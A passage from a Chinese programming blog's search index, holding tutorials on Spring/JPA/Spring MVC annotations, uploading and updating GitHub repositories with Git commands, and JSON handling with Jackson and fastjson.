message;</span><br></pre></td></tr></table></figure></li><li><p>@Inject：等价于默认的@Autowired，只是没有required属性；</p></li><li><p>@Component：泛指组件，当组件不好归类的时候，我们可以使用这个注解进行标注。带此注解的类看为组件，就是说当我们的类不属于各种归类的时候（不属于@Controller、@Services等的时候），我们就可以使用@Component来标注这个类。</p></li><li><p>@Qualifier：当有多个同一类型的Bean时，可以用@Qualifier(“name”)来指定。与@Autowired配合使用。@Qualifier限定描述符除了能根据名字进行注入，但能进行更细粒度的控制如何选择候选者，具体使用方式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@Autowired</span><br><span class="line">@Qualifier(value = “demoInfoService”)</span><br><span class="line">private DemoInfoService demoInfoService;</span><br></pre></td></tr></table></figure></li><li>@Resource(name=”name”,type=”type”)：没有括号内内容的话，默认byName。与@Autowired干类似的事。<br>-<br>@Resource有两个常用属性name、type，所以分4种情况：<br>1、指定name和type：通过name找到唯一的bean，找不到抛出异常；如果type和字段类型不一致，也会抛出异常<br>2、指定name：通过name找到唯一的bean，找不到抛出异常<br>3、指定type：通过tpye找到唯一的bean，如果不唯一，则抛出异常：NoUniqueBeanDefinitionException<br>4、都不指定：通过字段名作为key去查找，找到则赋值；找不到则再通过字段类型去查找，如果不唯一，则抛出异常：NoUniqueBeanDefinitionException</li></ul><p>@Autowired<br>1、@Autowired只有一个属性required，默认值为true，为true时，找不到就抛异常，为false时，找不到就赋值为null。<br>2、@Autowired按类型查找，如果该类型的bean不唯一，则抛出异常；可通过组合注解解决@Autowired()@Qualifier(“baseDao”)</p><p>不同点：<br>Resource是JDK提供的，而Autowired是Spring提供的<br>Resource不允许找不到bean的情况，而Autowired允许（@Autowired(required = false)）<br>指定name的方式不一样，@Resource(name = “baseDao”),@Autowired()@Qualifier(“baseDao”)<br>Resource默认通过name查找，而Autowired默认通过type查找</p><h2 id="JPA注解"><a href="#JPA注解" class="headerlink" title="JPA注解"></a>JPA注解</h2><ul><li><p>@Entity：@Table(name=”“)：表明这是一个实体类。一般用于jpa这两个注解一般一块使用，但是如果表名和实体类名相同的话，@Table可以省略</p></li><li><p>@Table 当实体类与其映射的数据库表名不同名时需要使用，声明此对象映射到数据库的数据表，通过它可以为实体指定表(talbe)。</p></li><li><p>@MappedSuperClass:用在确定是父类的entity上。父类的属性子类可以继承。</p></li><li><p>@NoRepositoryBean:一般用作父类的repository，有这个注解，spring不会去实例化该repository。</p></li><li><p>@Column：用来标识实体类中属性与数据表中字段的对应关系。如果字段名与列名相同，则可以省略。</p></li><li><p>@Id：表示该属性为主键。</p></li><li><p>@GeneratedValue(strategy = GenerationType.SEQUENCE,generator = “repair_seq”)：表示主键生成策略是sequence（可以为Auto、IDENTITY、native等，Auto表示可在多个数据库间切换），指定sequence的名字是repair_seq。</p></li><li><p>@SequenceGeneretor(name = “repair_seq”, sequenceName = “seq_repair”, allocationSize = 1)：name为sequence的名称，以便使用，sequenceName为数据库的sequence名称，两个名称可以一致。</p></li><li><p>@Transient：表示该属性并非一个到数据库表的字段的映射,ORM框架将忽略该属性。如果一个属性并非数据库表的字段映射,就务必将其标示为@Transient,否则,ORM框架默认其注解为@Basic。@Basic(fetch=FetchType.LAZY)：标记可以指定实体属性的加载方式</p></li><li><p>@JsonIgnore：作用是json序列化时将Java bean中的一些属性忽略掉,序列化和反序列化都受影响。</p></li><li><p>@JoinColumn（name=”loginId”）:一对一：本表中指向另一个表的外键。一对多：另一个表指向本表的外键。</p></li><li><p>@OneToOne、@OneToMany、@ManyToOne：对应hibernate配置文件中的一对一，一对多，多对一。</p></li></ul><h2 id="springMVC相关注解"><a href="#springMVC相关注解" class="headerlink" title="springMVC相关注解"></a>springMVC相关注解</h2><ul><li><p>@RequestMapping：@RequestMapping(“/path”)表示该控制器处理所有“/path”的UR L请求。RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。<br>用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。该注解有六个属性：<br>params:指定request中必须包含某些参数值是，才让该方法处理。<br>headers:指定request中必须包含某些指定的header值，才能让该方法处理请求。<br>value:指定请求的实际地址，指定的地址可以是URI Template 模式<br>method:指定请求的method类型， GET、POST、PUT、DELETE等<br>consumes:指定处理请求的提交内容类型（Content-Type），如application/json,text/html;<br>produces:指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回</p></li><li><p>@RequestParam：用在方法的参数前面。将请求参数绑定到你控制器的方法参数上（是springmvc中接收普通参数的注解）<br>接收请求地址末尾为？(value的参数名)的请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">语法：@RequestParam(value=”参数名”,required=”<span class="literal">true</span>/<span class="literal">false</span>”,defaultValue=””)</span><br><span class="line"> </span><br><span class="line">value：参数名</span><br><span class="line"> </span><br><span class="line">required：是否包含该参数，默认为<span class="literal">true</span>，表示该请求路径中必须包含该参数，如果不包含就报错。</span><br><span class="line"></span><br><span class="line">defaultValue：默认参数值，如果设置了该值，required=<span class="literal">true</span>将失效，自动为<span class="literal">false</span>,如果没有传该参数，就使用默认值</span><br><span class="line">@RequestMapping(<span class="string">"/list"</span>)</span><br><span class="line">public String <span class="built_in">test</span>(@RequestParam(value = <span class="string">"userId"</span>, defaultValue = <span class="string">"0"</span>, required = <span class="literal">false</span>) int userId) &#123;</span><br><span class="line">　　<span class="built_in">return</span> <span class="string">"list"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li>@PathVariable:路径变量。参数与大括号里的名字一样要相同.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestMapping(“user/get/mac/&#123;macAddress&#125;”)</span><br><span class="line">  2 public String getByMacAddress(@PathVariable String macAddress)&#123;</span><br><span class="line">  3    //<span class="keyword">do</span> something; </span><br><span class="line">  4 &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="全局异常处理"><a href="#全局异常处理" class="headerlink" title="全局异常处理"></a>全局异常处理</h2><ul><li><p>@ControllerAdvice：包含@Component。可以被扫描到。统一处理异常。</p></li><li><p>@ExceptionHandler（Exception.class）：用在方法上面表示遇到这个异常就执行以下方法。</p></li></ul><h2 id="项目中具体配置解析和使用环境"><a href="#项目中具体配置解析和使用环境" class="headerlink" title="项目中具体配置解析和使用环境"></a>项目中具体配置解析和使用环境</h2><ul><li>@MappedSuperclass：<br>1.@MappedSuperclass 注解使用在父类上面，是用来标识父类的</li></ul><p>2.@MappedSuperclass 标识的类表示其不能映射到数据库表，因为其不是一个完整的实体类，但是它所拥有的属性能够映射在其子类对用的数据库表中</p><p>3.@MappedSuperclass 标识的类不能再有@Entity或@Table注解</p><ul><li>@Column：<br>1.当实体的属性与其映射的数据库表的列不同名时需要使用@Column标注说明，该属性通常置于实体的属性声明语句之前，还可与 @Id 标注一起使用。</li></ul><p>2.@Column 标注的常用属性是name，用于设置映射数据库表的列名。此外，该标注还包含其它多个属性，如：unique、nullable、length、precision等。具体如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">name属性：name属性定义了被标注字段在数据库表中所对应字段的名称</span><br><span class="line">unique属性：unique属性表示该字段是否为唯一标识，默认为<span class="literal">false</span>，如果表中有一个字段需要唯一标识，则既可以使用该标记，也可以使用@Table注解中的@UniqueConstraint</span><br><span class="line">nullable属性：nullable属性表示该字段是否可以为null值，默认为<span class="literal">true</span></span><br><span class="line">insertable属性：insertable属性表示在使用”INSERT”语句插入数据时，是否需要插入该字段的值</span><br><span class="line">updateable属性：updateable属性表示在使用”UPDATE”语句插入数据时，是否需要更新该字段的值</span><br><span class="line">insertable和updateable属性：一般多用于只读的属性，例如主键和外键等，这些字段通常是自动生成的</span><br><span class="line">columnDefinition属性：columnDefinition属性表示创建表时，该字段创建的SQL语句，一般用于通过Entity生成表定义时使用，如果数据库中表已经建好，该属性没有必要使用</span><br><span class="line">table属性：table属性定义了包含当前字段的表名</span><br><span class="line">length属性：length属性表示字段的长度，当字段的类型为varchar时，该属性才有效，默认为255个字符</span><br><span class="line">precision属性和scale属性：precision属性和scale属性一起表示精度，当字段类型为double时，precision表示数值的总长度，scale表示小数点所占的位数</span><br><span class="line">    具体如下：</span><br><span class="line">   1.double类型将在数据库中映射为double类型，precision和scale属性无效</span><br><span class="line">   2.double类型若在columnDefinition属性中指定数字类型为decimal并指定精度，则最终以columnDefinition为准</span><br><span class="line">   3.BigDecimal类型在数据库中映射为decimal类型，precision和scale属性有效</span><br><span class="line">   4.precision和scale属性只在BigDecimal类型中有效</span><br></pre></td></tr></table></figure><br>3.@Column 标注的columnDefinition属性: 表示该字段在数据库中的实际类型.通常 ORM 框架可以根据属性类型自动判断数据库中字段的类型,但是对于Date类型仍无法确定数据库中字段类型究竟是DATE,TIME还是TIMESTAMP.此外,String的默认映射类型为VARCHAR,如果要将 String 类型映射到特定数据库的 BLOB 或TEXT字段类型.</p><p>4.@Column标注也可置于属性的getter方法之前</p><ul><li>@PreUpdate和@PrePersist:<br>@PreUpdate<br>1.用于为相应的生命周期事件指定回调方法。<br>2.该注释可以应用于实体类，映射超类或回调监听器类的方法。<br>3.用于setter 如果要每次更新实体时更新实体的属性，可以使用@PreUpdate注释。<br>4.使用该注释，您不必在每次更新用户实体时显式更新相应的属性。<br>5.preUpdate不允许您更改您的实体。 您只能使用传递给事件的计算的更改集来修改原始字段值。<br>@Prepersist<br>1.查看@PrePersist注释，帮助您在持久化之前自动填充实体属性。<br>2.可以用来在使用jpa的时记录一些业务无关的字段，比如最后更新时间等等。生命周期方法注解（delete没有生命周期事件）<br>3.@PrePersist save之前被调用，它可以返回一个DBObject代替一个空的 @PostPersist save到datastore之后被调用<br>4.@PostLoad 在Entity被映射之后被调用 @EntityListeners 指定外部生命周期事件实现类<br>实体Bean生命周期的回调事件:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">方法的标注： @PrePersist @PostPersist @PreRemove @PostRemove @PreUpdate @PostUpdate @PostLoad 。</span><br><span class="line">它们标注在某个方法之前，没有任何参数。这些标注下的方法在实体的状态改变前后时进行调用，相当于拦截器;</span><br><span class="line">pre 表示在状态切换前触发，post 则表示在切换后触发。 </span><br><span class="line">@PostLoad 事件在下列情况触发： </span><br><span class="line">1. 执行 EntityManager.find()或 getreference()方法载入一个实体后； </span><br><span class="line">2. 执行 JPA QL 查询过后； </span><br><span class="line">3. EntityManager.refresh( )方法被调用后。 </span><br><span class="line">@PrePersist 和 @PostPersist事件在实体对象插入到数据库的过程中发生;</span><br><span class="line">@PrePersist 事件在调用 EntityManager.persist()方法后立刻发生，级联保存也会发生此事件，此时的数据还没有真实插入进数据库。</span><br><span class="line">@PostPersist 事件在数据已经插入进数据库后发生。</span><br><span class="line">@PreUpdate 和 @PostUpdate 事件的触发由更新实体引起, @PreUpdate 事件在实体的状态同步到数据库之前触发，此时的数据还没有真实更新到数据库。</span><br><span class="line">@PostUpdate 事件在实体的状态同步到数据库后触发，同步在事务提交时发生。 </span><br><span class="line">@PreRemove 和 @PostRemove 事件的触发由删除实体引起，@ PreRemove 事件在实体从数据库删除之前触发，即调用了 EntityManager.remove()方法或者级联删除</span><br><span class="line"></span><br><span class="line">当你在执行各种持久化方法的时候，实体的状态会随之改变，状态的改变会引发不同的生命周期事件。这些事件可以使用不同的注释符来指示发生时的回调函数。</span><br><span class="line">@javax.persistence.PostLoad：加载后。</span><br><span class="line">@javax.persistence.PrePersist：持久化前。</span><br><span class="line">@javax.persistence.PostPersist：持久化后。</span><br><span class="line">@javax.persistence.PreUpdate：更新前。</span><br><span class="line">@javax.persistence.PostUpdate：更新后。</span><br><span class="line">@javax.persistence.PreRemove：删除前。</span><br><span class="line">@javax.persistence.PostRemove：删除后。</span><br></pre></td></tr></table></figure><img src="/img/Bean.jpg" alt="实体Bean生命周期"><br>1）数据库查询</li></ul><p>@PostLoad事件在下列情况下触发：</p><p>执行EntityManager.find()或getreference()方法载入一个实体后。</p><p>执行JPQL查询后。</p><p>EntityManager.refresh()方法被调用后。</p><p>2）数据库插入</p><p>@PrePersist和@PostPersist事件在实体对象插入到数据库的过程中发生：</p><p>@PrePersist事件在调用persist()方法后立刻发生，此时的数据还没有真正插入进数据库。</p><p>@PostPersist事件在数据已经插入进数据库后发生。</p><p>3）数据库更新</p><p>@PreUpdate和@PostUpdate事件的触发由更新实体引起：</p><p>@PreUpdate事件在实体的状态同步到数据库之前触发，此时的数据还没有真正更新到数据库。</p><p>@PostUpdate事件在实体的状态同步到数据库之后触发，同步在事务提交时发生。</p><p>4）数据库删除</p><p>@PreRemove和@PostRemove事件的触发由删除实体引起：</p><p>@PreRemove事件在实体从数据库删除之前触发，即在调用remove()方法删除时发生，此时的数据还没有真正从数据库中删除。</p><p>@PostRemove事件在实体从数据库中删除后触发。</p><h2 id="使用-Configuration注解来代替Spring的bean配置"><a href="#使用-Configuration注解来代替Spring的bean配置" class="headerlink" title="使用@Configuration注解来代替Spring的bean配置"></a>使用@Configuration注解来代替Spring的bean配置</h2><ul><li><p>Spring配置文件（application-config.xml）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans&gt;</span><br><span class="line">        &lt;bean id=<span class="string">"orderService"</span> class=<span class="string">"com.acme.OrderService"</span>/&gt;</span><br><span class="line">                &lt;constructor-arg ref=<span class="string">"orderRepository"</span>/&gt;</span><br><span class="line">        &lt;/bean&gt;</span><br><span class="line">        &lt;bean id=<span class="string">"orderRepository"</span> class=<span class="string">"com.acme.OrderRepository"</span>/&gt;</span><br><span class="line">                &lt;constructor-arg ref=<span class="string">"dataSource"</span>/&gt;</span><br><span class="line">        &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></li><li><p>Spring Java @Configuratio通过java代码来装配bean的方案：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Configuration</span><br><span class="line">public class ApplicationConfig &#123;</span><br><span class="line"></span><br><span class="line">        public @Bean OrderService <span class="function"><span class="title">orderService</span></span>() &#123;</span><br><span class="line">                <span class="built_in">return</span> new OrderService(orderRepository());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public @Bean OrderRepository <span class="function"><span class="title">orderRepository</span></span>() &#123;</span><br><span class="line">                <span class="built_in">return</span> new OrderRepository(dataSource());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用bean</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JavaConfigApplicationContext ctx = new JavaConfigApplicationContext(ApplicationConfig.class);</span><br><span class="line">OrderService orderService = ctx.getBean(OrderService.class);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Annotation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Annotation </tag>
            
            <tag> 注解代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Git上传、更新、删除GitHub仓库文件</title>
      <link href="/2019/08/19/%E4%BD%BF%E7%94%A8Git%E4%B8%8A%E4%BC%A0%E3%80%81%E6%9B%B4%E6%96%B0%E3%80%81%E5%88%A0%E9%99%A4%20GitHub%20%E4%BB%93%E5%BA%93%E6%96%87%E4%BB%B6/"/>
      <url>/2019/08/19/%E4%BD%BF%E7%94%A8Git%E4%B8%8A%E4%BC%A0%E3%80%81%E6%9B%B4%E6%96%B0%E3%80%81%E5%88%A0%E9%99%A4%20GitHub%20%E4%BB%93%E5%BA%93%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>本文为转载CSDN博主<a href="https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind" target="_blank" rel="noopener">ZY-JIMMY</a>的文章,感谢博主转载允许</p><h2 id="创建GitHub代码仓库"><a href="#创建GitHub代码仓库" class="headerlink" title="创建GitHub代码仓库"></a>创建GitHub代码仓库</h2><p>首先在GitHub上创建自己的仓库，进入GitHub官网并登陆，点击 <code>New repository</code> 如下图<br><img src="/img/GitHub1.png" alt=""><br>然后输入自己的仓库名称及仓库说明，输入完毕后点击 <code>Create repository</code></p><blockquote><p>Repository name: 仓库名称<br>Description(可选): 仓库描述介绍<br>Public, Private : 仓库权限（公开共享，私有或指定合作者）<br>Initialize this repository with a README: 添加一个README.md<br>gitignore: 不需要进行版本管理的仓库类型，对应生成文件.gitignore<br>license: 证书类型，对应生成文件LICENSE<br><img src="/img/GitHub2.png" alt=""><br>如下图所示，建立好了一个代码仓库，可将项目的文件、文件夹通过 Git 上传至此<br><img src="/img/GitHub3.png" alt=""></p></blockquote><h2 id="获取Git"><a href="#获取Git" class="headerlink" title="获取Git"></a>获取Git</h2><p>在Git官网下载最新版本的Git软件安装到本地：<a href="https://www.git-scm.com/download/" target="_blank" rel="noopener">https://www.git-scm.com/download/</a></p><h2 id="上传本地项目文件到GitHub新建仓库"><a href="#上传本地项目文件到GitHub新建仓库" class="headerlink" title="上传本地项目文件到GitHub新建仓库"></a>上传本地项目文件到GitHub新建仓库</h2><p>点击<code>Clone or dowload</code>会出现一个地址，copy这个地址备用。<br><img src="/img/GitHub4.png" alt=""><br>接下来回到本地操作，首先右键你的项目，如果你之前安装git成功的话，右键会出现两个新选项，分别为<em>Git Gui Here</em>,<em>Git Bash Here</em>,这里我们选择<code>Git Bash Here</code>，进入如下界面，Bank即为我的项目名。<br><img src="/img/GitHub5.png" alt=""><br>接下来输入如下命令（<code>关键步骤</code>），把github上面的仓库克隆到本地<br><code>git clone 仓库地址</code><br><img src="/img/GitHub6.png" alt=""><br>进入本地项目文件夹，其中会多出一个和github上面的仓库名相同的文件夹，我们把本地项目文件夹下的所有文件（除了新多出的那个文件夹）都复制到那个新多出的文件夹下<br><img src="/img/GitHub7.png" alt=""><br>输入命令<code>cd 仓库名称</code>，进入本地仓库文件夹<br><img src="/img/GitHub8.png" alt=""><br>接下来依次输入以下代码即可完成其他剩余操作：<br>git add .        （后面的 . 是把该文件夹下面的文件都添加进来）</p><p>git commit  -m  “提交信息”  （“提交信息”是自定义的，如“first commit”）</p><p>git pull origin master    （先使用pull，进行合并然后再进行push，即先使用pull将远程文件同步下来。）</p><p>git push -u origin master   （此操作目的是把本地仓库push到github上面，此步骤需要你输入帐号和密码）<br><img src="/img/GitHub9.png" alt=""><br><img src="/img/GitHub10.png" alt=""><br><img src="/img/GitHub11.png" alt=""><br>完成以上步骤后，查看代码仓库会发现项目已经上传成功<br><img src="/img/GitHub12.png" alt=""><br>上传本地项目文件到GitHub已有代码仓库<br>上传文件夹：参考<a href="https://blog.csdn.net/geerniya/article/details/79552247、" target="_blank" rel="noopener">https://blog.csdn.net/geerniya/article/details/79552247、</a>  <a href="https://blog.csdn.net/weixin_42350212/article/details/80560272" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42350212/article/details/80560272</a></p><p>备注：<br>hexo g 生成静态资源<br>hexo d 部署<br>hexo clean 清除静态缓存<br>hexo s启动服务</p><p>执行git命令时出现fatal: ‘origin’ does not appear to be a git repository错误<br>git remote add origin git@github.com:raineddown/raineddown.github.io.git<br> 将关联远程仓库为origin</p><p> [rejected] master -&gt; master (non-fast-forward)<br>git pull origin master —allow-unrelated-histories //把远程仓库和本地同步，消除差异</p><p>修改分支：<br>git checkout -b xxxx</p><p>git push 失败解决方法：<a href="https://blog.csdn.net/Ltime/article/details/70224456" target="_blank" rel="noopener">https://blog.csdn.net/Ltime/article/details/70224456</a><br><img src="/img/GitHub13.png" alt=""><br><img src="/img/GitHub14.png" alt=""><br><img src="/img/GitHub15.png" alt=""></p><p>上传文件<br><img src="/img/GitHub16.png" alt=""><br><img src="/img/GitHub17.png" alt=""></p><h2 id="使用Git更新GitHub仓库文件"><a href="#使用Git更新GitHub仓库文件" class="headerlink" title="使用Git更新GitHub仓库文件"></a>使用Git更新GitHub仓库文件</h2><p>参考：<a href="https://blog.csdn.net/asuna_yu/article/details/80174011" target="_blank" rel="noopener">https://blog.csdn.net/asuna_yu/article/details/80174011</a><br><img src="/img/GitHub18.png" alt=""><br><img src="/img/GitHub19.png" alt=""></p><h2 id="使用Git删除Github仓库文件夹"><a href="#使用Git删除Github仓库文件夹" class="headerlink" title="使用Git删除Github仓库文件夹"></a>使用Git删除Github仓库文件夹</h2><p>参考：<a href="https://blog.csdn.net/luocheng7430/article/details/81222231" target="_blank" rel="noopener">https://blog.csdn.net/luocheng7430/article/details/81222231</a><br>     <a href="https://www.cnblogs.com/crazyStar/articles/7354894.html" target="_blank" rel="noopener">https://www.cnblogs.com/crazyStar/articles/7354894.html</a><br><img src="/img/GitHub20.png" alt=""><br><img src="/img/GitHub21.png" alt=""><br><img src="/img/GitHub22.png" alt=""><br><img src="/img/GitHub23.png" alt=""><br><img src="/img/GitHub24.png" alt=""></p><p>Git 各种命令：<a href="https://www.cnblogs.com/smiler/p/5074124.html" target="_blank" rel="noopener">https://www.cnblogs.com/smiler/p/5074124.html</a> </p>]]></content>
      
      
      <categories>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON基础</title>
      <link href="/2019/08/19/JSON/"/>
      <url>/2019/08/19/JSON/</url>
      
        <content type="html"><![CDATA[<h2 id="JSON简介"><a href="#JSON简介" class="headerlink" title="JSON简介"></a>JSON简介</h2><p>JSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率，是JavaScript对象的字符串表示法，它使用文本表示一个 JS 对象的信息。降维说人话就是一种便于理解、编译、传输用于描述实例的字符串。</p><h2 id="Json要求和语法格式"><a href="#Json要求和语法格式" class="headerlink" title="Json要求和语法格式"></a>Json要求和语法格式</h2><ul><li>对象表示为键值对，数据由逗号分隔</li><li>花括号保存对象</li><li>方括号保存数组</li></ul><p>JSON 键值对是用来保存 JavaScript 对象的一种方式，键/值对组合中的键名写在前面并用双引号 “” 包裹，使用冒号 : 分隔，然后紧接着值：<br>例如：name为键、Hello world为数据值即从后端获取的对象/值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Hello world"</span>&#125; </span><br><span class="line">//下为JSON数组格式//</span><br><span class="line">&#123;<span class="string">"name"</span>:[<span class="string">"luoyonghao"</span>,<span class="string">"jiayueting"</span>,<span class="string">"sunyuchen"</span>]&#125;</span><br></pre></td></tr></table></figure></p><h2 id="JSON解析工具"><a href="#JSON解析工具" class="headerlink" title="JSON解析工具"></a>JSON解析工具</h2><h3 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h3><p>Jackson框架是基于Java平台的一套数据处理工具<br>依赖：<br><a href="https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind" target="_blank" rel="noopener">官方依赖</a><br>pom.xml配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.10.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><br>将对象转化为JSON字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//创建一个jackson的对象映射器，用来解析数据</span><br><span class="line">ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">//将对象解析成为json格式</span><br><span class="line">String str = mapper.writeValueAsString(解析对象名);</span><br></pre></td></tr></table></figure><br>前端js相关<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//将js对象转换成json字符串</span><br><span class="line"> var str = JSON.stringify(js对象);</span><br><span class="line"> console.log(str);</span><br><span class="line"> </span><br><span class="line"> //将json字符串转换为js对象</span><br><span class="line"> var js对象 = JSON.parse(str);</span><br><span class="line"> console.log(js对象.age,js对象.name,js对象.sex);</span><br></pre></td></tr></table></figure></p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>fastJson是阿里巴巴出品的一个json序列化工具<br>依赖配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;1.2.60&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><br>将对象转化为JSON字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String objJson = JSON.toJSONString(Object object);</span><br></pre></td></tr></table></figure><br>将Json串转换成java对象<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//对象是单个元素</span><br><span class="line">String objJson = JSON.parseObject(json对象，CLAZZ);</span><br><span class="line">//对象包含多个元素</span><br><span class="line">String objJson = JSON.parseArray(json对象，CLAZZ)；</span><br><span class="line">//CLAZZ为String.class为Map.class等等</span><br></pre></td></tr></table></figure></p><h2 id="JSON相关注解代码"><a href="#JSON相关注解代码" class="headerlink" title="JSON相关注解代码"></a>JSON相关注解代码</h2><h3 id="RestController"><a href="#RestController" class="headerlink" title="@RestController"></a>@RestController</h3><p>等价于@Controller + @ResponseBody<br>在类上直接使用 @RestController ，这样子，里面所有的方法都只会返回 json 字符串</p><h3 id="GetMapping"><a href="#GetMapping" class="headerlink" title="@GetMapping"></a>@GetMapping</h3><p>获取get请求<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@RestController</span><br><span class="line">public class UserController &#123;</span><br><span class="line"></span><br><span class="line">   @GetMapping(value = <span class="string">"/json"</span>)</span><br><span class="line">   public String json() throws JsonProcessingException &#123;</span><br><span class="line">       ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">       User user = new User(<span class="string">"zhangsan"</span>, 17, <span class="string">"男"</span>);</span><br><span class="line">       //将对象解析成为json格式</span><br><span class="line">       String str = mapper.writeValueAsString(user);</span><br><span class="line">       //@ResponseBody,json格式返回</span><br><span class="line">       <span class="built_in">return</span> str;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 